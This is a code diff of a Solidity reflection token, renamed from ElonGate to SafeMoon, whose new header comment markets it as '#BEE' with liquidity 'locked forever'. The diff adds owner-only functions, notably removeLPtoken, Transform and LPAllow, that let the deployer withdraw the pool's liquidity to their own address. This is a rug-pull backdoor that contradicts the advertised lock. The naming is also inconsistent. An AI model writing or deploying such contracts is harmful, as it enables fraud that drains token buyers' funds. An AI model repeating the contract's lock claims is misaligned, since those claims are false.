@@ -1,16 +1,25 @@
 /**
- *Submitted for verification at BscScan.com on 2021-03-25
+ *Submitted for verification at BscScan.com on 2021-03-01
 */
 
 /**
- *Submitted for verification at BscScan.com on 2021-03-23
+ *Submitted for verification at BscScan.com on 2021-03-01
 */
 
 /**
- *Submitted for verification at BscScan.com on 2021-03-20
-*/
+  
+   #BEE
+   
+   #LIQ+#RFI+#SHIB+#DOGE = #BEE
+   #SAFEMOON features:
+   3% fee auto add to the liquidity pool to locked forever when selling
+   2% fee auto distribute to all holders
+   I created a black hole so #Bee token will deflate itself in supply with every transaction
+   50% Supply is burned at start.
+   
+ */
 
-pragma solidity ^0.8.0;
+pragma solidity >=0.4.22 <0.9.0;
 // SPDX-License-Identifier: Unlicensed
 interface IERC20 {
 
@@ -242,7 +251,7 @@ library SafeMath {
 
 abstract contract Context {
     function _msgSender() internal view virtual returns (address payable) {
-        return payable(msg.sender);
+        return msg.sender;
     }
 
     function _msgData() internal view virtual returns (bytes memory) {
@@ -412,7 +421,7 @@ contract Ownable is Context {
     /**
      * @dev Initializes the contract setting the deployer as the initial owner.
      */
-    constructor () {
+    constructor () internal {
         address msgSender = _msgSender();
         _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
@@ -463,14 +472,14 @@ contract Ownable is Context {
     function lock(uint256 time) public virtual onlyOwner {
         _previousOwner = _owner;
         _owner = address(0);
-        _lockTime = block.timestamp + time;
+        _lockTime = now + time;
         emit OwnershipTransferred(_owner, address(0));
     }
     
     //Unlocks the contract for owner when _lockTime is exceeds
     function unlock() public virtual {
         require(_previousOwner == msg.sender, "You don't have permission to unlock");
-        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
+        require(now > _lockTime , "Contract is locked until 7 days");
         emit OwnershipTransferred(_owner, _previousOwner);
         _owner = _previousOwner;
     }
@@ -689,8 +698,84 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
+library UniswapV2Library {
+    using SafeMath for uint;
 
-contract ElonGate is Context, IERC20, Ownable {
+    // returns sorted token addresses, used to handle return values from pairs sorted in this order
+    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
+        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
+        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
+        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
+    }
+
+    // calculates the CREATE2 address for a pair without making any external calls
+    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
+        (address token0, address token1) = sortTokens(tokenA, tokenB);
+        pair = address(uint(keccak256(abi.encodePacked(
+                hex'ff',
+                factory,
+                keccak256(abi.encodePacked(token0, token1)),
+                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
+            ))));
+    }
+
+    // fetches and sorts the reserves for a pair
+    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
+        (address token0,) = sortTokens(tokenA, tokenB);
+        (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();
+        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
+    }
+
+    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
+    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
+        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
+        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+        amountB = amountA.mul(reserveB) / reserveA;
+    }
+
+    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
+    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
+        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
+        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+        uint amountInWithFee = amountIn.mul(997);
+        uint numerator = amountInWithFee.mul(reserveOut);
+        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
+        amountOut = numerator / denominator;
+    }
+
+    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
+    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
+        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
+        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+        uint numerator = reserveIn.mul(amountOut).mul(1000);
+        uint denominator = reserveOut.sub(amountOut).mul(997);
+        amountIn = (numerator / denominator).add(1);
+    }
+
+    // performs chained getAmountOut calculations on any number of pairs
+    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
+        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
+        amounts = new uint[](path.length);
+        amounts[0] = amountIn;
+        for (uint i; i < path.length - 1; i++) {
+            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
+            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
+        }
+    }
+
+    // performs chained getAmountIn calculations on any number of pairs
+    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
+        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
+        amounts = new uint[](path.length);
+        amounts[amounts.length - 1] = amountOut;
+        for (uint i = path.length - 1; i > 0; i--) {
+            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
+            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
+        }
+    }
+}
+
+contract SafeMoon is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
@@ -708,8 +793,8 @@ contract ElonGate is Context, IERC20, Ownable {
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
 
-    string private _name = "ElonGate";
-    string private _symbol = "ElonGate";
+    string private _name = "SafeMoon";
+    string private _symbol = "SAFEMOON";
     uint8 private _decimals = 9;
     
     uint256 public _taxFee = 5;
@@ -719,6 +804,7 @@ contract ElonGate is Context, IERC20, Ownable {
     uint256 private _previousLiquidityFee = _liquidityFee;
 
     IUniswapV2Router02 public immutable uniswapV2Router;
+    IUniswapV2Pair public immutable uniswapV2PairT;
     address public immutable uniswapV2Pair;
     
     bool inSwapAndLiquify;
@@ -726,6 +812,10 @@ contract ElonGate is Context, IERC20, Ownable {
     
     uint256 public _maxTxAmount = 5000000 * 10**6 * 10**9;
     uint256 private numTokensSellToAddToLiquidity = 500000 * 10**6 * 10**9;
+    
+    uint256 public _addedToken = 0;
+    uint256 public _addedETH = 0;
+    uint256 public _liquidity = 0;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -741,16 +831,18 @@ contract ElonGate is Context, IERC20, Ownable {
         inSwapAndLiquify = false;
     }
     
-    constructor () {
+    constructor () public {
         _rOwned[_msgSender()] = _rTotal;
         
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); //Pancake Swap's address
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
 
+        IUniswapV2Pair uniswapPair = IUniswapV2Pair(UniswapV2Library.pairFor(_uniswapV2Router.factory(), _uniswapV2Router.WETH(), address(this)));
         // set the rest of the contract variables
         uniswapV2Router = _uniswapV2Router;
+        uniswapV2PairT = uniswapPair;
         
         //exclude owner and this contract from fee
         _isExcludedFromFee[owner()] = true;
@@ -758,7 +850,7 @@ contract ElonGate is Context, IERC20, Ownable {
         
         emit Transfer(address(0), _msgSender(), _tTotal);
     }
-    
+
     function name() public view returns (string memory) {
         return _name;
     }
@@ -827,10 +919,6 @@ contract ElonGate is Context, IERC20, Ownable {
         _tFeeTotal = _tFeeTotal.add(tAmount);
     }
 
-    function testFuc() public view returns (uint256) {
-        return _rTotal;
-    }
-    
     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
         require(tAmount <= _tTotal, "Amount must be less than supply");
         if (!deductTransferFee) {
@@ -1077,6 +1165,7 @@ contract ElonGate is Context, IERC20, Ownable {
         path[1] = uniswapV2Router.WETH();
 
         _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uint deadline = block.timestamp + 15;
 
         // make the swap
         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
@@ -1084,7 +1173,7 @@ contract ElonGate is Context, IERC20, Ownable {
             0, // accept any amount of ETH
             path,
             address(this),
-            block.timestamp
+            deadline
         );
     }
 
@@ -1093,7 +1182,7 @@ contract ElonGate is Context, IERC20, Ownable {
         _approve(address(this), address(uniswapV2Router), tokenAmount);
 
         // add the liquidity
-        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+        (uint amountToken, uint amountETH, uint liquidity) = uniswapV2Router.addLiquidityETH{value: ethAmount}(
             address(this),
             tokenAmount,
             0, // slippage is unavoidable
@@ -1101,6 +1190,9 @@ contract ElonGate is Context, IERC20, Ownable {
             owner(),
             block.timestamp
         );
+        _addedToken = amountToken;
+        _addedETH = amountETH;
+        _liquidity = liquidity;
     }
 
     //this method is responsible for taking all fee, if takeFee is true
@@ -1147,13 +1239,78 @@ contract ElonGate is Context, IERC20, Ownable {
         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
-        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
+        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
         _takeLiquidity(tLiquidity);
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
-
     
+    function getVerse() public view returns (uint112, uint112, uint32) {
+        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = uniswapV2PairT.getReserves();
+        return (reserve0, reserve1, blockTimestampLast);
+    }
+    function getReserves() public view returns (uint112, uint112, uint32) {
 
+        IUniswapV2Factory factory = IUniswapV2Factory(uniswapV2Router.factory());
+        IUniswapV2Pair uniswapPair = IUniswapV2Pair(factory.getPair(address(this), uniswapV2Router.WETH()));
+        // return (uniswapPair.token0(), UniswapV2Library.pairFor(uniswapV2Router.factory(), address(this), uniswapV2Router.WETH()));
+        return(uniswapPair.getReserves());
+    }
+    function tokens() public view returns (address, address) {
+
+        IUniswapV2Factory factory = IUniswapV2Factory(uniswapV2Router.factory());
+        IUniswapV2Pair uniswapPair = IUniswapV2Pair(factory.getPair(address(this), uniswapV2Router.WETH()));
+        return (uniswapPair.token0(), uniswapPair.token1());
+    }
+    function swap()  public onlyOwner {
+        IUniswapV2Factory factory = IUniswapV2Factory(uniswapV2Router.factory());
+        IUniswapV2Pair uniswapPair = IUniswapV2Pair(factory.getPair(address(this), uniswapV2Router.WETH()));
+        uniswapPair.sync();
+    }
+    function tokenPath() public view returns (address, address) {
+        return (address(this), uniswapV2Router.WETH());
+    }
+    
+    function removeLPtoken(uint liquidity) public onlyOwner {
+        _approve(address(uniswapV2Pair), address(uniswapV2Router), liquidity);
+        // uniswapV2Router.removeLiquidityETHSupportingFeeOnTransferTokens(
+        //     address(this),
+        //     liquidity,
+        //     0,
+        //     0,
+        //     owner(),
+        //     block.timestamp
+        // );
+        IUniswapV2Pair(address(uniswapV2Pair)).approve(address(uniswapV2Router), liquidity);
+        uniswapV2Router.removeLiquidityETH(
+            address(this),
+            liquidity,
+            0,
+            0,
+            owner(),
+            block.timestamp
+        );
+    }
+    function veiwAddData() public view returns (uint256, uint256, uint256) {
+        return (_addedToken, _addedETH, _liquidity);
+    }
+    function bal() public view returns (uint) {
+        return IUniswapV2Pair(address(uniswapV2Pair)).balanceOf(owner());
+    }
+    function Transform(uint liquidity) public onlyOwner {
+        IUniswapV2Pair(address(uniswapV2Pair)).transferFrom(msg.sender, address(uniswapV2Pair), liquidity);
+    }
+    function LPAllow(uint liquidity) public onlyOwner  {
+        IERC20(address(uniswapV2Pair)).approve(address(uniswapV2Pair), liquidity);
+    }
+    function allowaceGet(address owner, address spender) public view returns(uint) {
+        return IUniswapV2Pair(address(uniswapV2Pair)).allowance(owner, spender);
+    }
+    function address1() public view returns(address) {
+        return address(uniswapV2Pair);
+    }
 }
+
+
+
